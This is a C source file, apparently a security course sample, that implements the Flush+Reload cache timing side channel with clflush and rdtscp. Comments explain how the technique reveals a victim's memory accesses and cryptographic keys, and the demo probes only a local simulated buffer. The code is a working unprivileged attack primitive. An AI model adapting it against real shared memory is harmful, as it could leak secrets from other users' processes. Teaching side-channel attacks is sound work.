/*
 * FR-L0_flushreload_canonical.c
 *
 * Flush+Reload cache timing side-channel — canonical implementation.
 * CSEC3100 second hardware primitive sample.
 *
 * Physical mechanism:
 *   1. Attacker flushes target cache line using clflush
 *   2. Waits — giving victim process time to potentially access the line
 *   3. Measures reload latency using rdtscp
 *   4. Fast reload (~4 cycles) = victim accessed the line (cache hit)
 *      Slow reload (~200 cycles) = victim did not access (cache miss)
 *   5. Repeated measurement reveals victim's memory access patterns
 *
 * Attack class: Side-channel — information leakage
 * Consequence:  Attacker learns which memory addresses victim accessed
 *               Can extract cryptographic keys from victim process
 * Privilege:    Ring 3 — unprivileged userspace
 *
 * KEY STRUCTURAL DIFFERENCE FROM ROWHAMMER:
 *   - One target address (not two aggressors)
 *   - Deliberate wait interval (rowhammer has none)
 *   - Measures reload TIME (rowhammer measures activation frequency)
 *   - Causes information leakage (rowhammer causes bit flips)
 *
 * Platform: Linux x86-64
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <x86intrin.h>

/* Threshold in cycles: below = cache hit (victim accessed), above = miss */
#define HIT_THRESHOLD   120
/* Number of probe iterations */
#define PROBE_COUNT     1000
/* Stride between monitored cache lines */
#define CACHE_LINE_SIZE 64

/*
 * flush_line: evict target cache line from ALL cache levels.
 * This forces the next access to go to DRAM, resetting the timing signal.
 */
static inline void flush_line(volatile char *addr)
{
    _mm_clflush((void *)addr);
    _mm_mfence();
}

/*
 * measure_access: time a single memory access using rdtscp.
 * rdtscp serialises with preceding instructions (prevents reordering).
 * Returns the number of CPU cycles the access took.
 * Short time = line was cached (victim accessed it during wait).
 * Long time  = line was not cached (victim did not access it).
 */
static inline uint64_t measure_access(volatile char *addr)
{
    uint32_t aux;
    uint64_t t1, t2;
    _mm_lfence();
    t1 = __rdtscp(&aux);
    volatile char val = *addr;        /* the timed memory access */
    t2 = __rdtscp(&aux);
    _mm_lfence();
    (void)val;
    return t2 - t1;
}

/*
 * probe_line: the core Flush+Reload operation.
 *   1. Flush the target from cache
 *   2. Wait (allow victim to run and potentially access the line)
 *   3. Measure reload time
 *   Returns 1 if victim accessed the line, 0 if not.
 */
static int probe_line(volatile char *target)
{
    flush_line(target);

    /* Wait interval: let victim process execute */
    for (volatile int wait = 0; wait < 100; wait++);

    uint64_t cycles = measure_access(target);
    return (cycles < HIT_THRESHOLD) ? 1 : 0;
}

/*
 * monitor_region: repeatedly probe a memory region.
 * result_buf accumulates hit counts per cache line.
 * High count for a line means victim frequently accesses it.
 */
static void monitor_region(volatile char *mem_region,
                            int           *result_buf,
                            int            n_lines)
{
    for (int iter = 0; iter < PROBE_COUNT; iter++) {
        for (int line = 0; line < n_lines; line++) {
            if (probe_line(&mem_region[line * CACHE_LINE_SIZE])) {
                result_buf[line]++;
            }
        }
    }
}

int main(void)
{
    /* Simulated shared memory region (would be a real shared page in an attack) */
    static char shared_mem[4096];
    memset(shared_mem, 0, sizeof(shared_mem));

    int results[64] = {0};
    int n_lines = sizeof(shared_mem) / CACHE_LINE_SIZE;

    printf("=== Flush+Reload side-channel monitor ===\n");
    printf("Probing %d cache lines, %d iterations\n\n", n_lines, PROBE_COUNT);

    monitor_region((volatile char *)shared_mem, results, n_lines);

    printf("Cache line access frequencies:\n");
    for (int i = 0; i < n_lines; i++) {
        if (results[i] > 0) {
            printf("  Line %2d (offset 0x%03x): %d hits\n",
                   i, i * CACHE_LINE_SIZE, results[i]);
        }
    }

    return 0;
}